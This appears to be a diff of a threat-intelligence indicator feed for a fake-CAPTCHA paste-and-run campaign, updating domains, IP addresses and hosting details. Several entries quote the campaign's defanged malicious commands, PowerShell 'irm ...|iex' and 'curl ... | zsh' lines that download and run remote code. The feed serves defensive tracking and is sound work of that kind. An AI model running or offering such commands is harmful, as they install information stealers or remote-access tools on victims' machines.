@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 4948,
+ "count": 4949,
  "indicators": [
   {
    "indicator": "100porcentopiaui.com.br",
@@ -479,6 +479,13 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2606:4700:3035::6815:4abd",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-03",
      "last_seen": "2026-11-03"
     }
    ],
@@ -2193,12 +2200,12 @@
    "actor_link": null,
    "commands": [
     "irm 'id-verfied.boats/[id]'|iex;",
-    "irm 'ncheck-brows[.]beer/[id]'|iex;",
-    "irm 'jscdncloude[.]beer/[id]'|iex;"
+    "irm 'ncheck-brows[.]beer/[id]'|iex",
+    "irm 'ncheck-brows[.]beer/[id]'|iex;"
    ],
    "connects_to": [
-    "id-verfied.boats",
     "ncheck-brows.beer",
+    "id-verfied.boats",
     "jscdncloude.beer"
    ],
    "lure_from": [
@@ -3331,20 +3338,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "GoDaddy",
-   "ip": "141.193.213.11",
+   "ip": "141.193.213.10",
    "asn": "AS209242",
    "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
    "country": "US",
    "ips": [
     {
-     "ip": "141.193.213.11",
+     "ip": "141.193.213.10",
      "asn": "AS209242",
      "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-03"
     },
     {
-     "ip": "141.193.213.10",
+     "ip": "141.193.213.11",
      "asn": "AS209242",
      "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
      "first_seen": "2026-11-01",
@@ -3529,12 +3536,12 @@
    "actor_link": null,
    "commands": [
     "irm 'id-verfied.boats/[id]'|iex;",
-    "irm 'ncheck-brows[.]beer/[id]'|iex;",
-    "irm 'jscdncloude[.]beer/[id]'|iex;"
+    "irm 'ncheck-brows[.]beer/[id]'|iex",
+    "irm 'ncheck-brows[.]beer/[id]'|iex;"
    ],
    "connects_to": [
-    "id-verfied.boats",
     "ncheck-brows.beer",
+    "id-verfied.boats",
     "jscdncloude.beer"
    ],
    "lure_from": [
@@ -4597,6 +4604,13 @@
    "country": "DE",
    "ips": [
     {
+     "ip": "88.222.222.40",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "92.113.16.56",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
@@ -4618,7 +4632,21 @@
      "last_seen": "2026-11-03"
     },
     {
+     "ip": "92.113.23.65",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "92.113.23.84",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "92.113.23.106",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-03",
@@ -4772,6 +4800,13 @@
      "last_seen": "2026-11-03"
     },
     {
+     "ip": "2a02:4780:43:fca2:e829:71e7:91e7:7961",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "92.113.16.49",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
@@ -4787,6 +4822,13 @@
     },
     {
      "ip": "92.113.23.51",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2.57.91.57",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-03",
@@ -5695,15 +5737,16 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "t-trustrest.com",
     "xorados.com",
     "trek-72.com",
+    "t-trustrest.com",
+    "trustchecknes.com",
     "id-verfied.boats",
     "jscdncloude.beer"
    ],
@@ -7783,6 +7826,13 @@
    "country": "DE",
    "ips": [
     {
+     "ip": "2a02:4780:42:654d:90fe:20a3:ddb6:b754",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "2a02:4780:45:e5ab:5266:529b:18e3:76a8",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
@@ -7797,6 +7847,13 @@
      "last_seen": "2026-11-03"
     },
     {
+     "ip": "88.222.222.224",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "92.113.23.158",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
@@ -7805,6 +7862,13 @@
     },
     {
      "ip": "92.113.23.163",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "92.113.23.186",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-03",
@@ -11049,11 +11113,18 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "2a02:4780:84:f2e2:8f44:3d2c:e95d:8da2",
+   "ip": "92.113.16.147",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "CY",
+   "country": "DE",
    "ips": [
+    {
+     "ip": "92.113.16.147",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
     {
      "ip": "2.57.91.35",
      "asn": "AS47583",
@@ -11087,13 +11158,6 @@
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-11-03"
-    },
-    {
-     "ip": "92.113.16.147",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
      "last_seen": "2026-11-03"
     },
     {
@@ -19864,12 +19928,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
+    "trek-72.com",
     "t-trustrest.com",
-    "trek-72.com"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -27185,6 +27251,27 @@
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2a02:4780:45:873e:8608:564c:a5fb:a7d9",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2a02:4780:84:63d8:2cfb:40fb:fad7:d761",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2a02:4780:84:3dbc:89fb:3641:1bdc:afb4",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
      "last_seen": "2026-11-03"
     }
    ],
@@ -34983,13 +35070,6 @@
      "last_seen": "2026-11-03"
     },
     {
-     "ip": "188.114.97.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-03"
-    },
-    {
      "ip": "2606:4700:3034::ac43:81c9",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
@@ -35001,6 +35081,13 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-01",
      "last_seen": "2026-11-03"
     },
     {
@@ -46235,7 +46322,7 @@
    "product": null,
    "hosting": "OVHcloud",
    "dns": "OVH",
-   "ip": "213.186.33.87",
+   "ip": "2001:41d0:1:1b00:213:186:33:87",
    "asn": "AS16276",
    "org": "OVH OVH SAS, FR",
    "country": "FR",
@@ -47585,13 +47672,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
     "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustrest.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at",
@@ -48305,8 +48394,8 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null"
    ],
    "connects_to": [
@@ -48317,6 +48406,7 @@
     "groverudder12.com",
     "jscdncloude.beer",
     "code.nvc-info.beer",
+    "trustchecknes.com",
     "cloud-browse.codes"
    ],
    "lure_from": [
@@ -48689,6 +48779,13 @@
    "country": "CY",
    "ips": [
     {
+     "ip": "2a02:4780:43:8f27:d873:b936:5022:a8a",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "2a02:4780:44:9692:37da:beaf:217d:5963",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
@@ -48710,7 +48807,21 @@
      "last_seen": "2026-11-03"
     },
     {
+     "ip": "2a02:4780:84:f1a8:1e61:d8fc:7ed5:dd14",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "92.113.16.53",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2.57.91.154",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-03",
@@ -49251,7 +49362,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-26",
-   "last_seen": "2026-11-02",
+   "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
    "offline_since": null,
    "url": "https://carfellas.ch/",
@@ -49269,7 +49380,7 @@
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-10-26",
-     "last_seen": "2026-11-02"
+     "last_seen": "2026-11-03"
     }
    ],
    "hosts": [
@@ -49277,7 +49388,7 @@
      "host": "carfellas.ch",
      "status": "online",
      "first_seen": "2026-10-26",
-     "last_seen": "2026-11-02"
+     "last_seen": "2026-11-03"
     }
    ],
    "actor": null,
@@ -49668,7 +49779,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "172.67.147.246",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -49695,13 +49806,6 @@
      "last_seen": "2026-11-03"
     },
     {
-     "ip": "188.114.97.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-03"
-    },
-    {
      "ip": "2a06:98c1:3120::3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
@@ -49713,6 +49817,13 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-01",
      "last_seen": "2026-11-03"
     },
     {
@@ -60164,18 +60275,11 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "2a02:4780:42:6de:fba:f462:de11:eecf",
+   "ip": "2a02:4780:44:8dcd:547e:5050:acac:870",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
    "country": "DE",
    "ips": [
-    {
-     "ip": "2a02:4780:42:6de:fba:f462:de11:eecf",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
     {
      "ip": "2a02:4780:43:a351:e319:96f4:efb:16de",
      "asn": "AS47583",
@@ -60206,6 +60310,13 @@
     },
     {
      "ip": "88.222.222.152",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2a02:4780:42:6de:fba:f462:de11:eecf",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
@@ -73678,16 +73789,17 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "(irm 'hxxps[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "t-trustrest.com",
     "xorados.com",
     "trek-72.com",
-    "lepafonso.bz"
+    "t-trustrest.com",
+    "lepafonso.bz",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -77330,6 +77442,7 @@
     "interseq.at",
     "nikogdatakonebilo.cc",
     "efreitorher.org",
+    "yaebalciganovvjopu.org",
     "yaebaltakuyusety.com",
     "ciganshina.org",
     "pakistanskimalchik.org",
@@ -79287,7 +79400,7 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "92.113.16.188",
+   "ip": "2a02:4780:45:eb25:d471:1081:55c6:5853",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
    "country": "DE",
@@ -79321,14 +79434,14 @@
      "last_seen": "2026-11-03"
     },
     {
-     "ip": "92.113.16.188",
+     "ip": "92.113.16.49",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
      "last_seen": "2026-11-03"
     },
     {
-     "ip": "92.113.16.49",
+     "ip": "92.113.16.188",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
@@ -82402,10 +82515,31 @@
      "last_seen": "2026-11-03"
     },
     {
+     "ip": "2a02:4780:84:c4da:9caa:fa66:3929:a9ce",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "84.32.84.207",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "84.32.84.77",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "88.222.222.167",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
      "last_seen": "2026-11-03"
     },
     {
@@ -83454,7 +83588,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-26",
-   "last_seen": "2026-11-02",
+   "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
    "offline_since": null,
    "url": "https://eng-stakebet.com/",
@@ -83462,11 +83596,18 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "92.113.23.176",
+   "ip": "2a02:4780:44:2a98:fb6e:5d97:83fb:7623",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
    "country": "DE",
    "ips": [
+    {
+     "ip": "2a02:4780:44:2a98:fb6e:5d97:83fb:7623",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
     {
      "ip": "92.113.23.176",
      "asn": "AS47583",
@@ -83487,7 +83628,7 @@
      "host": "eng-stakebet.com",
      "status": "online",
      "first_seen": "2026-10-26",
-     "last_seen": "2026-11-02"
+     "last_seen": "2026-11-03"
     }
    ],
    "actor": null,
@@ -84285,7 +84426,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-26",
-   "last_seen": "2026-10-27",
+   "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
    "offline_since": null,
    "url": "https://eraaluminyum.com.tr/",
@@ -84293,11 +84434,25 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "92.113.16.46",
+   "ip": "92.113.23.138",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
    "country": "DE",
    "ips": [
+    {
+     "ip": "92.113.23.138",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "92.113.23.216",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
     {
      "ip": "92.113.16.46",
      "asn": "AS47583",
@@ -84311,7 +84466,7 @@
      "host": "eraaluminyum.com.tr",
      "status": "online",
      "first_seen": "2026-10-26",
-     "last_seen": "2026-10-27"
+     "last_seen": "2026-11-03"
     }
    ],
    "actor": null,
@@ -85224,7 +85379,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-26",
-   "last_seen": "2026-10-27",
+   "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
    "offline_since": null,
    "url": "https://espritjourneys.com/",
@@ -85242,7 +85397,7 @@
      "asn": "AS136557",
      "org": "HOST-AS-AP - Host Universal Pty Ltd, AU",
      "first_seen": "2026-10-26",
-     "last_seen": "2026-10-27"
+     "last_seen": "2026-11-03"
     }
    ],
    "hosts": [
@@ -85250,7 +85405,7 @@
      "host": "espritjourneys.com",
      "status": "online",
      "first_seen": "2026-10-26",
-     "last_seen": "2026-10-27"
+     "last_seen": "2026-11-03"
     }
    ],
    "actor": null,
@@ -85787,6 +85942,13 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2606:4700:3033::6815:3def",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-03",
      "last_seen": "2026-11-03"
     }
    ],
@@ -87341,13 +87503,13 @@
    "commands": [
     "irm 'jscdncloude[.]beer/[id]'|iex;",
     "irm 'cloud-browse[.]codes/[id]'|iex;",
-    "irm 'ncheck-brows[.]beer/[id]'|iex;"
+    "irm 'ncheck-brows[.]beer/[id]'|iex"
    ],
    "connects_to": [
     "jscdncloude.beer",
+    "ncheck-brows.beer",
     "cloud-browse.codes",
     "code.nvc-info.beer",
-    "ncheck-brows.beer",
     "id-verfied.boats",
     "verifing-server.codes",
     "auth-code.nvc-info.beer"
@@ -89216,11 +89378,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/9682206365' -Headers @{'X-WUA'='9682206365'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
+    "trek-72.com",
     "t-trustrest.com",
-    "trek-72.com"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -96695,16 +96858,17 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null"
    ],
    "connects_to": [
     "xorados.com",
     "t-trustrest.com",
     "hagosuro.lc",
+    "trek-72.com",
     "groverudder12.com",
-    "trek-72.com"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -96925,8 +97089,8 @@
    "connects_to": [
     "jscdncloude.beer",
     "code.nvc-info.beer",
-    "cloud-browse.codes",
     "ncheck-brows.beer",
+    "cloud-browse.codes",
     "id-verfied.boats",
     "verifing-server.codes",
     "auth-code.nvc-info.beer"
@@ -98862,8 +99026,8 @@
    "connects_to": [
     "jscdncloude.beer",
     "code.nvc-info.beer",
-    "cloud-browse.codes",
     "ncheck-brows.beer",
+    "cloud-browse.codes",
     "id-verfied.boats",
     "verifing-server.codes"
    ],
@@ -99188,8 +99352,8 @@
    "connects_to": [
     "jscdncloude.beer",
     "code.nvc-info.beer",
-    "cloud-browse.codes",
     "ncheck-brows.beer",
+    "cloud-browse.codes",
     "id-verfied.boats",
     "verifing-server.codes",
     "auth-code.nvc-info.beer"
@@ -100497,6 +100661,7 @@
     "mon-blanc-02.cfd",
     "abcsgftr.cc",
     "efreitorher.org",
+    "yaebalciganovvjopu.org",
     "nikogdatakonebilo.cc",
     "ciganshina.org",
     "pakistanskimalchik.org"
@@ -101428,27 +101593,13 @@
    "product": "Instagram",
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "191.101.104.14",
+   "ip": "2a02:4780:45:fc10:3c02:5330:dbb:8fd9",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "US",
+   "country": "DE",
    "ips": [
     {
-     "ip": "191.101.104.14",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
-    {
      "ip": "191.101.104.237",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
-    {
-     "ip": "2a02:4780:42:6a50:283a:847:45e5:3272",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
@@ -101477,6 +101628,20 @@
     },
     {
      "ip": "92.113.16.185",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "191.101.104.14",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2a02:4780:42:6a50:283a:847:45e5:3272",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
@@ -108276,14 +108441,14 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "irm 'id-verfied.boats/[id]'|iex;"
+    "irm 'ncheck-brows[.]beer/[id]'|iex;",
+    "(irm 'hxxps[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
+    "ncheck-brows.beer",
     "id-verfied.boats",
     "lepafonso.bz",
-    "ncheck-brows.beer",
     "jscdncloude.beer",
     "t-trustrest.com",
     "xorados.com",
@@ -110447,7 +110612,7 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "2a02:4780:44:61e4:ee92:ebd0:3e86:c8e",
+   "ip": "92.113.16.151",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
    "country": "DE",
@@ -110467,13 +110632,6 @@
      "last_seen": "2026-11-03"
     },
     {
-     "ip": "2a02:4780:42:e768:d829:ccba:97b9:11e1",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
-    {
      "ip": "2a02:4780:43:9aaf:584f:e722:3e7:973a",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
@@ -110481,14 +110639,21 @@
      "last_seen": "2026-11-03"
     },
     {
-     "ip": "2a02:4780:44:61e4:ee92:ebd0:3e86:c8e",
+     "ip": "92.113.16.151",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
      "last_seen": "2026-11-03"
     },
     {
-     "ip": "92.113.16.151",
+     "ip": "2a02:4780:42:e768:d829:ccba:97b9:11e1",
+     "asn": "AS47583",
